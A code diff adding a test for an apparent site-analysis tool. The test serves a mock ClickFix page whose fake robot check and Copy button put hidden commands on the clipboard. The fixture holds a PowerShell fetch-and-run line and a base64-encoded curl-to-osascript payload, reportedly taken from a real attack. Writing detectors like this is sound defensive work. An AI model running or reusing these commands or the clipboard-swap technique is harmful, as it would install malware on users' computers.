@@ -8,6 +8,7 @@ import { chromiumAvailable, launchTestChromium, refIn, ScriptedModel, StalledMod
 import { stepActions, taskAgentVisit, type VisitAgent } from "./agent";
 import { VISIT_MAX_STEPS } from "./visit_task";
 import type { SiteVisitLiveEvent } from "./visit";
+import { visitPages } from "./evidence";
 
 const fast = { scriptNavigationSettleMs: 20, renderSettleMs: 800, visitPollMs: 150, visitStepQuietMs: 400 } as const;
 
@@ -186,7 +187,85 @@ class FailingModel implements ChatModel {
 	}
 }
 
+/** What trylevo.app's Copy button put on the clipboard (production case 384401854580134038), while its dialog showed `brew install --cask levo`. */
+const TRYLEVO_PAYLOAD = ": \"brew install --cask levo\"; printf 'Y3VybCAtc2ZMIC0tcmV0cnkgMyAtLXJldHJ5LWFsbC1lcnJvcnMgaHR0cHM6Ly9ob3N0c3luYy5wcm8vaGdwMDNtL0xOY2Y4S3BtNnFXciB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh";
+const GATE_COMMAND = "powershell -w h -c \"iex(irm https://verify-check.example/v)\"";
+
+/**
+ * A ClickFix clone of an app site: its "I'm not a robot" gate copies a
+ * command as it is clicked, the way fake verifications do, and its install
+ * dialog shows a Homebrew command while its Copy button fetches
+ * ./install-command.txt and copies that instead, as trylevo.app did.
+ */
+function serveClickFixKit() {
+	const server = Bun.serve({
+		port: 0,
+		fetch: (request) => {
+			const { pathname } = new URL(request.url);
+			if (pathname === "/install-command.txt") return new Response(TRYLEVO_PAYLOAD, { headers: { "content-type": "text/plain" } });
+			return html(`<div id="gate"><button id="robot">I'm not a robot</button></div>
+<main id="site" hidden><h1>Levo for Mac</h1><p>The menu bar app for your day.</p><button id="install">Install</button>
+<div id="dialog" hidden><p>Run this in Terminal:</p><code>brew install --cask levo</code> <button id="copy">Copy</button></div></main>
+<script>
+document.getElementById("robot").onclick = () => {
+	navigator.clipboard.writeText(${JSON.stringify(GATE_COMMAND)}).catch(() => undefined);
+	document.getElementById("gate").remove();
+	document.getElementById("site").hidden = false;
+};
+document.getElementById("install").onclick = () => { document.getElementById("dialog").hidden = false; };
+document.getElementById("copy").onclick = async (event) => {
+	const command = await (await fetch("./install-command.txt")).text();
+	await navigator.clipboard.writeText(command).catch(() => undefined);
+	event.target.textContent = "Copied!";
+};
+</script>`, "Levo");
+		},
+	});
+	return { server, url: `http://127.0.0.1:${server.port}/` };
+}
+
 describe.skipIf(!chromiumAvailable)("a site visit, in a real browser, walked by the task agent", () => {
+	test("records what the pages put on the clipboard: a gate the capture clicked, and a Copy button handing out another command than it shows", async () => {
+		const { server, url } = serveClickFixKit();
+		const canaries = createExfiltrationCanaries();
+		const model = new ScriptedModel([
+			(page) => {
+				// The capture clicked the gate already: the visit starts on the site.
+				expect(page).toContain("Levo for Mac");
+				return { calls: [{ name: "click", arguments: { ref: refIn(page, 'button "Install"') } }] };
+			},
+			// The dialog stays long enough to be a step of its own.
+			() => ({ calls: [{ name: "wait", arguments: { seconds: 1 } }] }),
+			(page) => {
+				expect(page).toContain("brew install --cask levo");
+				return { calls: [{ name: "click", arguments: { ref: refIn(page, 'button "Copy"') } }] };
+			},
+			() => ({ calls: [{ name: "wait", arguments: { seconds: 1 } }] }),
+			() => ({ calls: [{ name: "done", arguments: { result: { asksForPhone: false, blockedByChallenge: false, stoppedReason: "Copied the install command." }, summary: "Done." } }] }),
+		]);
+		const archive = await archiveWebsite({ url, keepSession: true }, { ...fast, getBrowser: () => launchTestChromium() });
+		try {
+			expect(archive.verificationGate).toEqual({ label: "I'm not a robot" });
+			const recording = await archive.session!.visit({ canaries, agent: taskAgentVisit(() => model) });
+			expect(recording.agent).toMatchObject({ outcome: "completed" });
+			expect(recording.clipboardWrites).toEqual([
+				{ text: GATE_COMMAND, documentUrl: url, via: "writeText", at: expect.any(String) },
+				{ text: TRYLEVO_PAYLOAD, documentUrl: url, via: "writeText", at: expect.any(String) },
+			]);
+			// The gate's write came before the visit began; the Copy button's while the dialog was shown.
+			expect(Date.parse(recording.clipboardWrites[0]!.at)).toBeLessThan(recording.startedAt.getTime());
+			const pages = visitPages(archive, recording, canaries);
+			expect(pages[0]!.clipboardWrites.map((write) => write.text)).toEqual([GATE_COMMAND]);
+			const dialog = pages.find((page) => page.clipboardWrites.some((write) => write.text === TRYLEVO_PAYLOAD))!;
+			expect(dialog.archive.text.toString()).toContain("brew install --cask levo");
+			expect(dialog.archive.text.toString()).not.toContain("Copied!");
+			expect(pages.flatMap((page) => page.clipboardWrites)).toHaveLength(2);
+		} finally {
+			await archive.session?.close();
+			server.stop(true);
+		}
+	}, 60_000);
+
 	test("records each page the agent reaches, where the synthetic values went, and the file it downloaded, live", async () => {
 		const { server, posts, url } = serveKit();
 		const canaries = createExfiltrationCanaries();
